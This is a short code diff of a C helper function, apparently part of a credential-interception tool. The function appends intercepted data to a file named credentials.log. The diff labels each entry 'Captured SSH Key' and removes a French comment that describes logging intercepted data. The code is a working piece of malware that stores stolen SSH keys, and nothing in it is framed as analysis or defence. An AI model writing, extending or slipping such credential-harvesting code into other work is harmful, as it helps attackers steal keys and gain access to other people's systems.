@@ -1,14 +1,15 @@
-#include "utils.h"
 #include <stdio.h>
+#include <stdlib.h>
 #include <string.h>
+#include <unistd.h>
 
-// Écrit les données interceptées dans un fichier log
 void log_credentials(const char *data) {
     FILE *file = fopen("credentials.log", "a");
-    if (!file) {
-        perror("[UTILS] fopen");
+    if (file == NULL) {
+        perror("[log_credentials] Erreur lors de l'ouverture du fichier");
         return;
     }
-    fprintf(file, "%s\n", data);
+    fprintf(file, "Captured SSH Key:\n%s\n", data);
     fclose(file);
 }
+
